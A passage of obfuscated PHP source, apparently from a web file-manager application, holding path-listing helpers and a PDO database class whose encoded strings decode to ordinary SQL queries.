(!$¢Ç½¶‡) { $©¹ŒÅŸù->remove($ÁÃÏ‘Úû[$˜Šõ¼Ş–[487]]); unset($È‰ú–æ÷[$Å÷¥•—…]); continue; } $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]] = $¢Ç½¶‡; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[595]] = $„‰–œñã; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[596]] = Model($˜Šõ¼Ş–[597])->getInfoSimpleOuter($ÁÃÏ‘Úû[$˜Šõ¼Ş–[541]]); $È‰ú–æ÷[$Å÷¥•—…] = $ÁÃÏ‘Úû; } } $ÌŒš©â = USER_ID; $“èæ¶à¼ = array(); $¹ÃşÓûƒ = $this->_listAppendPath($“èæ¶à¼, !0); foreach ($™½ê¶® as $Å÷¥•—… => &$ÁÃÏ‘Úû) { if (!is_array($ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]])) { continue; } if ($ÁÃÏ‘Úû[$˜Šõ¼Ş–[188]] != $˜Šõ¼Ş–[598]) { continue; } if (isset($È‰ú–æ÷[$ÁÃÏ‘Úû[$˜Šõ¼Ş–[191]]])) { $ÑÑ™ „« = $È‰ú–æ÷[$ÁÃÏ‘Úû[$˜Šõ¼Ş–[191]]]; if (!is_array($ÁÃÏ‘Úû[$˜Šõ¼Ş–[555]])) { $ÁÃÏ‘Úû[$˜Šõ¼Ş–[555]] = array(); } $ÁÃÏ‘Úû[$˜Šõ¼Ş–[555]][$˜Šõ¼Ş–[599]] = $ÑÑ™ „«[$˜Šõ¼Ş–[594]]; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[600]] = $ÑÑ™ „«; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[601]] = $ÁÃÏ‘Úû[$˜Šõ¼Ş–[602]]; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[603]] = $˜Šõ¼Ş–[91]; if ($ÑÑ™ „«[$˜Šõ¼Ş–[541]] != $ÌŒš©â) { $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[503]] = $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[503]] & $ÑÑ™ „«[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[502]]; } continue; } $’Àó’Êñ = $this->parentLevelArray($ÁÃÏ‘Úû[$˜Šõ¼Ş–[604]]); $ÀÕ¦Óúˆ = array_reverse($’Àó’Êñ); foreach ($ÀÕ¦Óúˆ as $×¨ıä·å => $Í»Ñ÷ù) { if (!isset($È‰ú–æ÷[$Í»Ñ÷ù])) { continue; } $ÑÑ™ „« = $È‰ú–æ÷[$Í»Ñ÷ù]; $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[600]] = $ÑÑ™ „«; if ($ÑÑ™ „«[$˜Šõ¼Ş–[541]] != $ÌŒš©â) { $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[503]] = $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[503]] & $ÑÑ™ „«[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[502]]; } $ë¾ø­ıĞ = $˜Šõ¼Ş–[12]; $Í‰êì•¤ = count($’Àó’Êñ) - $×¨ıä·å; for ($Õ¨´Íá = 0; $Õ¨´Íá < $Í‰êì•¤; $Õ¨´Íá++) { if (!isset($¹ÃşÓûƒ[$’Àó’Êñ[$Õ¨´Íá]])) { $ë¾ø­ıĞ = $˜Šõ¼Ş–[12]; break; } $ë¾ø­ıĞ = $ë¾ø­ıĞ . rtrim($¹ÃşÓûƒ[$’Àó’Êñ[$Õ¨´Íá]], $˜Šõ¼Ş–[8]) . $˜Šõ¼Ş–[8]; } $ÁÃÏ‘Úû[$˜Šõ¼Ş–[502]][$˜Šõ¼Ş–[601]] = rtrim($ë¾ø­ıĞ, $˜Šõ¼Ş–[8]) . $˜Šõ¼Ş–[8]; break; } } unset($ÁÃÏ‘Úû); } public function groupPathDisplay(&$ÑÏ—í•Æ) { $û˜å˜”Ì =& $_SERVER[©—Ò»ÅĞ]; if ($ÑÏ—í•Æ[$û˜å˜”Ì[188]] != self::TYPE_GROUP) { return; } $ÆÀõ®æÙ = Model($û˜å˜”Ì[605])->getInfo($ÑÏ—í•Æ[$û˜å˜”Ì[589]]); $ÛÒ º’ø = $this->parentLevelArray($ÆÀõ®æÙ[$û˜å˜”Ì[604]]); $‹Èó¡„– = $û˜å˜”Ì[12]; foreach ($ÛÒ º’ø as $š¬¸¼â¶) { $¤û”ôÄŞ = Model($û˜å˜”Ì[605])->getInfo($š¬¸¼â¶); $‹Èó¡„– .= $¤û”ôÄŞ[$û˜å˜”Ì[90]][$û˜å˜”Ì[191]] . $û˜å˜”Ì[50]; } $ÑÏ—í•Æ[$û˜å˜”Ì[606]] = $ÆÀõ®æÙ[$û˜å˜”Ì[190]]; $ÑÏ—í•Æ[$û˜å˜”Ì[607]] = $ÆÀõ®æÙ[$û˜å˜”Ì[604]]; $ÑÏ—í•Æ[$û˜å˜”Ì[608]] = $ÆÀõ®æÙ[$û˜å˜”Ì[609]]; $ÑÏ—í•Æ[$û˜å˜”Ì[610]] = $‹Èó¡„– . $ÆÀõ®æÙ[$û˜å˜”Ì[90]][$û˜å˜”Ì[191]]; } protected function _listAppendPath(&$¦‰…§‡’, $¬çúşÜ = false) { $é²åã¿ =& $_SERVER[©—Ò»ÅĞ]; static $„Òà¢ı§ = array(); $Ç˜å„è³ = array(); $¤ªö³Ç³ = array(); if ($¬çúşÜ) { return $„Òà¢ı§; } foreach ($¦‰…§‡’ as &$£ŒÊáèÚ) { $Â¼ó·¾Ñ = $£ŒÊáèÚ[$é²åã¿[191]]; if ($£ŒÊáèÚ[$é²åã¿[500]] == $é²åã¿[91] && $£ŒÊáèÚ[$é²åã¿[190]] != 0) { $„Òà¢ı§[$Â¼ó·¾Ñ] = $£ŒÊáèÚ[$é²åã¿[32]]; } if ($£ŒÊáèÚ[$é²åã¿[500]] == $é²åã¿[91] && $£ŒÊáèÚ[$é²åã¿[190]] == 0) { $„Òà¢ı§[$Â¼ó·¾Ñ] = $this->_listAppendPathRoot($£ŒÊáèÚ, array()); } if (isset($¤ªö³Ç³[$£ŒÊáèÚ[$é²åã¿[604]]])) { continue; } $¤ªö³Ç³[$£ŒÊáèÚ[$é²åã¿[604]]] = !0; $£ÄçÀß = $this->parentLevelArray($£ŒÊáèÚ[$é²åã¿[604]]); foreach ($£ÄçÀß as $œ…ËÍÔÏ => $¯Äºëõ˜) { if (isset($„Òà¢ı§[$¯Äºëõ˜])) { continue; } if ($œ…ËÍÔÏ == 0) { $„Òà¢ı§[$¯Äºëõ˜] = $this->_listAppendPathRoot($£ŒÊáèÚ, $£ÄçÀß); } if ($œ…ËÍÔÏ != 0) { $Ç˜å„è³[] = $¯Äºëõ˜; } } } unset($£ŒÊáèÚ); $Ç˜å„è³ = array_unique($Ç˜å„è³); if (count($Ç˜å„è³) > 0) { $şî‹Ö¶É = array($é²åã¿[506] => array($é²åã¿[507], $Ç˜å„è³)); if (count($Ç˜å„è³) == 1) { $¤ª½å“ß = $this->sourceInfo($Ç˜å„è³[0]); $ÇÃ§ôÅ‹ = is_array($¤ª½å“ß) ? array($¤ª½å“ß) : !1; } else { $ÇÃ§ôÅ‹ = $this->field($é²åã¿[611])->where($şî‹Ö¶É)->select(); } if (!$ÇÃ§ôÅ‹) { $ÇÃ§ôÅ‹ = array(); } foreach ($ÇÃ§ôÅ‹ as $îÎ­÷µÏ) { $„Òà¢ı§[$îÎ­÷µÏ[$é²åã¿[191]]] = $îÎ­÷µÏ[$é²åã¿[32]]; } } $·Ää–â = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ûÑÚÌ« = array(); foreach ($¦‰…§‡’ as &$£ŒÊáèÚ) { $¶®©¨˜ª = $£ŒÊáèÚ[$é²åã¿[604]]; $½€©„Úç = $é²åã¿[12]; if (isset($ûÑÚÌ«[$¶®©¨˜ª])) { $½€©„Úç = $ûÑÚÌ«[$¶®©¨˜ª]; } else { $£ÄçÀß = $this->parentLevelArray($£ŒÊáèÚ[$é²åã¿[604]]); foreach ($£ÄçÀß as $œ…ËÍÔÏ => $¯Äºëõ˜) { if (isset($„Òà¢ı§[$¯Äºëõ˜])) { $½€©„Úç .= $„Òà¢ı§[$¯Äºëõ˜] . $é²åã¿[8]; } } $ûÑÚÌ«[$¶®©¨˜ª] = $½€©„Úç; } $½€©„Úç .= $£ŒÊáèÚ[$é²åã¿[32]]; if ($£ŒÊáèÚ[$é²åã¿[500]] == $é²åã¿[91]) { $½€©„Úç .= $é²åã¿[8]; } $£ŒÊáèÚ[$é²åã¿[602]] = str_replace($é²åã¿[254], $é²åã¿[8], $½€©„Úç); if ($£ŒÊáèÚ[$é²åã¿[190]] == $é²åã¿[228]) { $£ŒÊáèÚ[$é²åã¿[32]] = trim($„Òà¢ı§[$£ŒÊáèÚ[$é²åã¿[191]]], $é²åã¿[8]); $£ŒÊáèÚ[$é²åã¿[602]] = $£ŒÊáèÚ[$é²åã¿[32]] . $é²åã¿[8]; } if (intval($£ŒÊáèÚ[$é²åã¿[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($£ŒÊáèÚ, $£ÄçÀß, $·Ää–â); } } unset($£ŒÊáèÚ); return $¦‰…§‡’; } private function _listAppendPathRecycle(&$ãÕ…’áì, $¢Ö¼ô•Ê, $Ù‚ÍÓ³ˆ) { $‚ì—¦öê =& $_SERVER[©—Ò»ÅĞ]; if (!in_array($Ù‚ÍÓ³ˆ, $¢Ö¼ô•Ê) && $ãÕ…’áì[$‚ì—¦öê[191]] != $Ù‚ÍÓ³ˆ) { return; } $¾–…×ä = explode($‚ì—¦öê[8], trim($ãÕ…’áì[$‚ì—¦öê[602]], $‚ì—¦öê[8])); $ËË¾Ş´Ş = implode($‚ì—¦öê[8], array_slice($¾–…×ä, 2)); $ãÕ…’áì[$‚ì—¦öê[602]] = $‚ì—¦öê[8] . LNG($‚ì—¦öê[612]) . $‚ì—¦öê[8] . ltrim($ËË¾Ş´Ş, $‚ì—¦öê[8]); $ãÕ…’áì[$‚ì—¦öê[604]] = $‚ì—¦öê[613] . implode($‚ì—¦öê[50], array_slice($¢Ö¼ô•Ê, 1)) . $‚ì—¦öê[50]; if ($ãÕ…’áì[$‚ì—¦öê[191]] == $Ù‚ÍÓ³ˆ) { $ãÕ…’áì[$‚ì—¦öê[604]] = $‚ì—¦öê[613]; $ãÕ…’áì[$‚ì—¦öê[190]] = $‚ì—¦öê[228]; $ãÕ…’áì[$‚ì—¦öê[32]] = LNG($‚ì—¦öê[612]); } $ãÕ…’áì[$‚ì—¦öê[614]] = $‚ì—¦öê[615]; } protected function _listAppendPathRoot(&$¬‡Ÿ—«‡, $¥¸Ôî€•) { $€¾‘Ñå˜ =& $_SERVER[©—Ò»ÅĞ]; static $ıê¤©ƒ— = false; static $à¤×’â‚ = false; $Ÿ÷ÄšË² = $€¾‘Ñå˜[12]; if ($¬‡Ÿ—«‡[$€¾‘Ñå˜[188]] == self::TYPE_USER) { if ($¬‡Ÿ—«‡[$€¾‘Ñå˜[589]] == USER_ID) { $Ÿ÷ÄšË² = LNG($€¾‘Ñå˜[616]); if ($ıê¤©ƒ— === !1) { $µ¨ä§Õö = Model($€¾‘Ñå˜[617])->getInfoFull(USER_ID); $ıê¤©ƒ— = _get($µ¨ä§Õö, $€¾‘Ñå˜[618], $€¾‘Ñå˜[12]); } if ($à¤×’â‚ === !1) { $µ¨ä§Õö = Model($€¾‘Ñå˜[617])->getInfoFull(USER_ID); $à¤×’â‚ = _get($µ¨ä§Õö, $€¾‘Ñå˜[619], $€¾‘Ñå˜[12]); } if ($¥¸Ôî€• && $¥¸Ôî€•[0] == $ıê¤©ƒ— || !$¥¸Ôî€• && $¬‡Ÿ—«‡[$€¾‘Ñå˜[191]] == $ıê¤©ƒ—) { $Ÿ÷ÄšË² = LNG($€¾‘Ñå˜[620]); $¬‡Ÿ—«‡[$€¾‘Ñå˜[621]] = $€¾‘Ñå˜[622]; } if ($¥¸Ôî€• && $¥¸Ôî€•[0] == $à¤×’â‚ || !$¥¸Ôî€• && $¬‡Ÿ—«‡[$€¾‘Ñå˜[191]] == $à¤×’â‚) { $Ÿ÷ÄšË² = $Ÿ÷ÄšË² . $€¾‘Ñå˜[623] . LNG($€¾‘Ñå˜[624]); } if (!$¥¸Ôî€•) { $¬‡Ÿ—«‡[$€¾‘Ñå˜[32]] = $Ÿ÷ÄšË²; } } else { $µ¨ä§Õö = Model($€¾‘Ñå˜[617])->getInfoFull($¬‡Ÿ—«‡[$€¾‘Ñå˜[589]]); $³“Äº–æ = _get($µ¨ä§Õö, $€¾‘Ñå˜[619], $€¾‘Ñå˜[12]); $¬‡Ÿ—«‡[$€¾‘Ñå˜[625]] = Model($€¾‘Ñå˜[597])->getInfoSimpleOuter($¬‡Ÿ—«‡[$€¾‘Ñå˜[589]]); $Ÿ÷ÄšË² = LNG($€¾‘Ñå˜[626]) . $€¾‘Ñå˜[173] . $¬‡Ÿ—«‡[$€¾‘Ñå˜[625]][$€¾‘Ñå˜[32]] . $€¾‘Ñå˜[175]; if ($¥¸Ôî€• && $¥¸Ôî€•[0] == $³“Äº–æ || !$¥¸Ôî€• && $¬‡Ÿ—«‡[$€¾‘Ñå˜[191]] == $³“Äº–æ) { $Ÿ÷ÄšË² = LNG($€¾‘Ñå˜[626]) . $€¾‘Ñå˜[627] . $¬‡Ÿ—«‡[$€¾‘Ñå˜[625]][$€¾‘Ñå˜[32]] . $€¾‘Ñå˜[623] . LNG($€¾‘Ñå˜[624]) . $€¾‘Ñå˜[175]; } } } else { if ($¬‡Ÿ—«‡[$€¾‘Ñå˜[188]] == self::TYPE_GROUP) { $ÔÑ¸µÌ = Model($€¾‘Ñå˜[605])->getInfoSimple($¬‡Ÿ—«‡[$€¾‘Ñå˜[589]]); $Ÿ÷ÄšË² = $ÔÑ¸µÌ[$€¾‘Ñå˜[32]]; } else { if ($¬‡Ÿ—«‡[$€¾‘Ñå˜[188]] == self::TYPE_SYSTEM) { $Ÿ÷ÄšË² = $€¾‘Ñå˜[628]; } } } $Ÿ÷ÄšË² = $Ÿ÷ÄšË² ? $€¾‘Ñå˜[8] . $Ÿ÷ÄšË² . $€¾‘Ñå˜[8] : $€¾‘Ñå˜[8]; return $Ÿ÷ÄšË²; } protected function _listAppendUser(&$úò’ßÚÅ) { $ª´ûñæ¥ =& $_SERVER[©—Ò»ÅĞ]; $‰•ïÏÄß = array_to_keyvalue($úò’ßÚÅ, $ª´ûñæ¥[12], $ª´ûñæ¥[541]); $²´¦ùĞå = array_to_keyvalue($úò’ßÚÅ, $ª´ûñæ¥[12], $ª´ûñæ¥[543]); $‘†Ëµ = array_merge($‰•ïÏÄß, $²´¦ùĞå); $³­¸ì¸ò = Model($ª´ûñæ¥[617])->userListInfo($‘†Ëµ); foreach ($úò’ßÚÅ as &$ëÛ”Äò) { $³¡Ì„õı = $ëÛ”Äò[$ª´ûñæ¥[541]]; $ëÛ”Äò[$ª´ûñæ¥[541]] = $³­¸ì¸ò[$³¡Ì„õı] ? $³­¸ì¸ò[$³¡Ì„õı] : !1; $³¡Ì„õı = $ëÛ”Äò[$ª´ûñæ¥[543]]; $ëÛ”Äò[$ª´ûñæ¥[543]] = $³­¸ì¸ò[$³¡Ì„õı] ? $³­¸ì¸ò[$³¡Ì„õı] : !1; if (_get($ëÛ”Äò, $ª´ûñæ¥[629], 0)) { $ÈÒïÎ”Ó = $GLOBALS[$ª´ûñæ¥[6]][$ª´ûñæ¥[92]][$ª´ûñæ¥[630]]; if ($ëÛ”Äò[$ª´ûñæ¥[555]][$ª´ûñæ¥[631]] <= time() - $ÈÒïÎ”Ó) { $this->metaSet($ëÛ”Äò[$ª´ûñæ¥[191]], $ª´ûñæ¥[632], null); $this->metaSet($ëÛ”Äò[$ª´ûñæ¥[191]], $ª´ûñæ¥[631], null); unset($ëÛ”Äò[$ª´ûñæ¥[555]][$ª´ûñæ¥[632]]); continue; } $÷¿ÎÏù = $ëÛ”Äò[$ª´ûñæ¥[555]][$ª´ûñæ¥[632]]; $ëÛ”Äò[$ª´ûñæ¥[555]][$ª´ûñæ¥[633]] = Model($ª´ûñæ¥[617])->getInfoSimpleOuter($÷¿ÎÏù); } } unset($ëÛ”Äò); } public function parentLevelArray($»¯¸‹Ü) { $ø­Ïªİ =& $_SERVER[©—Ò»ÅĞ]; $»¯¸‹Ü = explode($ø­Ïªİ[50], trim($»¯¸‹Ü, $ø­Ïªİ[50])); return array_to_int(array_filter($»¯¸‹Ü)); } public function listAll($äÙÕ¨ú¨) { $ÇÊœö­á =& $_SERVER[©—Ò»ÅĞ]; $½´ëùê€ = $this->sourceInfo($äÙÕ¨ú¨); $€À”šÃÕ = array($ÇÊœö­á[634] => array($ÇÊœö­á[635], $½´ëùê€[$ÇÊœö­á[604]] . $äÙÕ¨ú¨ . $ÇÊœö­á[636]), $ÇÊœö­á[637] => 0); $ÙÜ©•æ¾ = $ÇÊœö­á[638]; $àÆòƒ‡µ = "\x4c\x45\x46\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\145\40\146\x69\x6c\145\40\x6f\156\x20\x73\157\x75\162\143\x65\56\x66\151\154\x65\111\104\x20\x3d\x20\146\x69\x6c\x65\56\146\x69\154\x65\111\x44"; $Ğ‹†ë­ß = $this->alias($ÇÊœö­á[533])->field($ÙÜ©•æ¾)->where($€À”šÃÕ)->join($àÆòƒ‡µ)->select(); $this->_listAppendAuth($Ğ‹†ë­ß); $this->_listAppendUser($Ğ‹†ë­ß); $this->_listAppendPath($Ğ‹†ë­ß); $Ğ‹†ë­ß = array_to_keyvalue($Ğ‹†ë­ß, $ÇÊœö­á[191]); $ÍÇ½ì»Ø = "\57{$½´ëùê€[$ÇÊœö­á[32]]}\57"; $ÍÇ½ì»Ø = $ÍÇ½ì»Ø == $ÇÊœö­á[254] ? $ÇÊœö­á[8] : $ÍÇ½ì»Ø; $â¾üÅ±ı = array(); foreach ($Ğ‹†ë­ß as $Šƒ€ì§ç => $·”ı¾¨) { $ïÎôÁ‹¦ = $this->parentLevelArray($·”ı¾¨[$ÇÊœö­á[604]]); array_shift($ïÎôÁ‹¦); $Ğ¢¯ö™Ù = $ÍÇ½ì»Ø; for ($€ß¶Êß = 0; $€ß¶Êß < count($ïÎôÁ‹¦); $€ß¶Êß++) { $Ğ¢¯ö™Ù .= $Ğ‹†ë­ß[$ïÎôÁ‹¦[$€ß¶Êß]][$ÇÊœö­á[32]] . $ÇÊœö­á[8]; } $Ğ¢¯ö™Ù .= $·”ı¾¨[$ÇÊœö­á[32]]; if ($·”ı¾¨[$ÇÊœö­á[500]]) { $Ğ¢¯ö™Ù .= $ÇÊœö­á[8]; } $ßŸ”†Î¶ = array($ÇÊœö­á[510] => str_replace($ÇÊœö­á[254], $ÇÊœö­á[8], str_replace($ÇÊœö­á[254], $ÇÊœö­á[8], str_replace($ÇÊœö­á[254], $ÇÊœö­á[8], $Ğ¢¯ö™Ù))), $ÇÊœö­á[639] => intval($·”ı¾¨[$ÇÊœö­á[500]]), $ÇÊœö­á[640] => intval($·”ı¾¨[$ÇÊœö­á[79]]), $ÇÊœö­á[88] => intval($·”ı¾¨[$ÇÊœö­á[88]]), $ÇÊœö­á[90] => $this->pathInfoFilter($·”ı¾¨)); if (!$ßŸ”†Î¶[$ÇÊœö­á[500]]) { $ßŸ”†Î¶[$ÇÊœö­á[557]] = $·”ı¾¨[$ÇÊœö­á[557]]; } $â¾üÅ±ı[] = $ßŸ”†Î¶; } $â¾üÅ±ı = array_sort_by($â¾üÅ±ı, $ÇÊœö­á[87]); return $â¾üÅ±ı; } } goto d‰ÄµòŒ«; b¢æÃŠ×š³: define($_SERVER[©—Ò»ÅĞ][317], 3); define($_SERVER[©—Ò»ÅĞ][318], 1); define($_SERVER[©—Ò»ÅĞ][319], 0); goto E¯”ï²È„Ì; aÓø…é„Õ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÉùÕàöÊ = '') { $Û‡õ±‚… =& $_SERVER[©—Ò»ÅĞ]; if (!class_exists($Û‡õ±‚…[1079])) { think_exception(think_lang($Û‡õ±‚…[14]) . $Û‡õ±‚…[1080]); } if (!empty($ÉùÕàöÊ)) { $this->config = $ÉùÕàöÊ; if (empty($this->config[$Û‡õ±‚…[17]])) { $this->config[$Û‡õ±‚…[17]] = array(); } } } public function connect($ü®¾ãù´ = '', $å€ÕŞ³ = 0) { $„óÒÔé =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->linkID[$å€ÕŞ³])) { if (empty($ü®¾ãù´)) { $ü®¾ãù´ = $this->config; } $­‚×ÌÑí = !empty($ü®¾ãù´[$„óÒÔé[17]][$„óÒÔé[18]]) ? $ü®¾ãù´[$„óÒÔé[17]][$„óÒÔé[18]] : $this->pconnect; if ($­‚×ÌÑí) { $ü®¾ãù´[$„óÒÔé[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$å€ÕŞ³] = new PDO($ü®¾ãù´[$„óÒÔé[1081]], $ü®¾ãù´[$„óÒÔé[1049]], $ü®¾ãù´[$„óÒÔé[1050]], $ü®¾ãù´[$„óÒÔé[17]]); } catch (PDOException $ïŞ˜ü) { think_exception($ïŞ˜ü->getMessage()); } $this->dbType = $this->_getDsnType($ü®¾ãù´[$„óÒÔé[1081]]); if (in_array($this->dbType, array($„óÒÔé[1082], $„óÒÔé[1083], $„óÒÔé[1084], $„óÒÔé[1085]))) { think_exception($„óÒÔé[1086] . $this->dbType . $„óÒÔé[1087] . $this->dbType . $„óÒÔé[1088]); } if (!$this->linkID[$å€ÕŞ³]) { think_exception($„óÒÔé[1089]); } try { $this->linkID[$å€ÕŞ³]->exec($„óÒÔé[1090] . think_config($„óÒÔé[1052])); } catch (Exception $ïŞ˜ü) { } $this->connected = !0; if (1 != think_config($„óÒÔé[22])) { unset($this->config); } } return $this->linkID[$å€ÕŞ³]; } public function free() { $this->PDOStatement = null; } public function query($Å¥¶Ö, $ã¶›Çô¶ = array()) { $¨ÁˆÅøµ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Å¥¶Ö; if (!empty($ã¶›Çô¶)) { $this->queryStr .= $¨ÁˆÅøµ[1091] . print_r($ã¶›Çô¶, !0) . $¨ÁˆÅøµ[1092]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¨ÁˆÅøµ[23], 1); think_status($¨ÁˆÅøµ[24]); $this->PDOStatement = $this->_linkID->prepare($Å¥¶Ö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $œéòä¤° = $this->PDOStatement->execute($ã¶›Çô¶); $this->debug(); if (!1 === $œéòä¤°) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($…¥•¼¹Ÿ, $ñÉ©§âˆ = array()) { $î†øıñƒ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…¥•¼¹Ÿ; if (!empty($ñÉ©§âˆ)) { $this->queryStr .= $î†øıñƒ[1091] . print_r($ñÉ©§âˆ, !0) . $î†øıñƒ[1092]; } $‡¦åİÑÑ = !1; if ($this->dbType == $î†øıñƒ[1085]) { if (preg_match($î†øıñƒ[1093], $this->queryStr, $çŒØ±‚)) { $this->table = think_config($î†øıñƒ[1094]) . str_ireplace(think_config($î†øıñƒ[1095]), $î†øıñƒ[463], $çŒØ±‚[2]); $‡¦åİÑÑ = (bool) $this->query($î†øıñƒ[1096] . strtoupper($this->table) . $î†øıñƒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($î†øıñƒ[25], 1); think_status($î†øıñƒ[24]); $this->PDOStatement = $this->_linkID->prepare($…¥•¼¹Ÿ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ùƒØâ¦« = $this->PDOStatement->execute($ñÉ©§âˆ); $this->debug(); if (!1 === $ùƒØâ¦«) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($‡¦åİÑÑ || preg_match($î†øıñƒ[1097], $…¥•¼¹Ÿ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡§Ÿ’‰Æ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¡§Ÿ’‰Æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢¿…½ìğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¢¿…½ìğ) { $this->error(); return !1; } } return !0; } private function getAll() { $ëçÓîÔ³ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ëçÓîÔ³); return $ëçÓîÔ³; } public function getFields($æéşö¸œ) { $Í¡¬ˆÛû =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (think_config($Í¡¬ˆÛû[1098])) { $©í†»Àâ = str_replace($Í¡¬ˆÛû[1099], $æéşö¸œ, think_config($Í¡¬ˆÛû[1098])); } else { switch ($this->dbType) { case $Í¡¬ˆÛû[1082]: case $Í¡¬ˆÛû[1100]: $©í†»Àâ = "\x53\105\x4c\x45\103\x54\40\x20\40\143\157\x6c\x75\x6d\156\137\x6e\141\x6d\145\x20\141\163\x20\47\116\x61\155\145\x27\54\x20\40\40\x64\x61\x74\x61\x5f\164\171\x70\145\x20\141\163\x20\47\124\171\160\145\x27\54\x20\x20\40\143\157\154\165\155\156\x5f\144\145\x66\x61\x75\x6c\164\x20\x61\163\x20\x27\104\x65\x66\x61\x75\x6c\x74\x27\54\40\40\40\x69\163\137\x6e\165\x6c\154\x61\x62\x6c\145\40\141\x73\40\47\116\165\x6c\154\47\xa\11\11\x46\122\117\x4d\x9\x69\156\146\x6f\162\x6d\141\x74\x69\x6f\x6e\x5f\163\143\150\x65\x6d\x61\x2e\164\x61\x62\154\145\163\40\101\123\x20\x74\xa\11\x9\112\117\x49\116\x9\x69\156\x66\x6f\x72\155\141\x74\151\157\x6e\x5f\x73\143\x68\145\155\x61\56\143\x6f\154\x75\155\x6e\x73\40\101\x53\40\x63\12\x9\x9\x4f\116\x20\x20\x74\x2e\164\141\142\x6c\145\137\143\x61\164\x61\x6c\157\147\40\75\x20\143\x2e\164\141\x62\154\145\x5f\143\x61\x74\x61\154\157\147\12\x9\11\101\116\x44\x20\164\x2e\x74\141\142\154\x65\137\163\x63\150\145\x6d\141\x20\75\40\x63\56\164\x61\142\154\145\137\163\143\150\145\x6d\141\12\x9\x9\x41\x4e\x44\x20\x74\56\x74\141\142\x6c\145\x5f\x6e\141\155\145\40\75\40\143\56\x74\x61\142\154\x65\137\x6e\x61\x6d\x65\xa\11\x9\x57\110\105\x52\x45\x20\40\x20\164\56\x74\141\x62\x6c\x65\137\x6e\x61\x6d\x65\x20\75\40\x27{$æéşö¸œ}\47"; break; case $Í¡¬ˆÛû[1101]: $©í†»Àâ = $Í¡¬ˆÛû[1102] . $æéşö¸œ . $Í¡¬ˆÛû[1103]; break; case $Í¡¬ˆÛû[1083]: case $Í¡¬ˆÛû[1085]: $©í†»Àâ = $Í¡¬ˆÛû[1104] . $Í¡¬ˆÛû[1105] . $Í¡¬ˆÛû[1106] . strtoupper($æéşö¸œ) . $Í¡¬ˆÛû[1107] . strtoupper($æéşö¸œ) . $Í¡¬ˆÛû[1108]; break; case $Í¡¬ˆÛû[1109]: $©í†»Àâ = $Í¡¬ˆÛû[1110] . $æéşö¸œ . $Í¡¬ˆÛû[1111]; break; case $Í¡¬ˆÛû[1084]: break; case $Í¡¬ˆÛû[1112]: default: $©í†»Àâ = $Í¡¬ˆÛû[1113] . ($this->dbType == $Í¡¬ˆÛû[1112] ? "\x60{$æéşö¸œ}\x60" : $æéşö¸œ); } } $—ª÷ç»¼ = $this->query($©í†»Àâ); $‘…÷¡…â = array(); if ($—ª÷ç»¼) { foreach ($—ª÷ç»¼ as $ø±ÆĞöß => $ÛˆÄÄ†) { $ÛˆÄÄ† = array_change_key_case($ÛˆÄÄ†); $ÛˆÄÄ†[$Í¡¬ˆÛû[32]] = isset($ÛˆÄÄ†[$Í¡¬ˆÛû[32]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[32]] : $Í¡¬ˆÛû[463]; $ÛˆÄÄ†[$Í¡¬ˆÛû[33]] = isset($ÛˆÄÄ†[$Í¡¬ˆÛû[33]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[33]] : $Í¡¬ˆÛû[463]; $îÂæúƒ› = isset($ÛˆÄÄ†[$Í¡¬ˆÛû[351]]) ? $ÛˆÄÄ†[$Í¡¬ˆÛû[351]] : $ÛˆÄÄ†[$Í¡¬ˆÛû[32]]; $‘…÷¡…â[$îÂæúƒ›] = array($Í¡¬ˆÛû[32] => $îÂæúƒ›, $Í¡¬ˆÛû[33] => $ÛˆÄÄ†[$Í¡¬ˆÛû[33]], $Í¡¬ˆÛû[35] => (bool) (isset($ÛˆÄÄ†[$Í¡¬ˆÛû[103]]) && $ÛˆÄÄ†[$Í¡¬ˆÛû[103]] === $Í¡¬ˆÛû[12] || isset($ÛˆÄÄ†[$Í¡¬ˆÛû[35]]) && $ÛˆÄÄ†[$Í¡¬ˆÛû[35]] === $Í¡¬ˆÛû[12]), 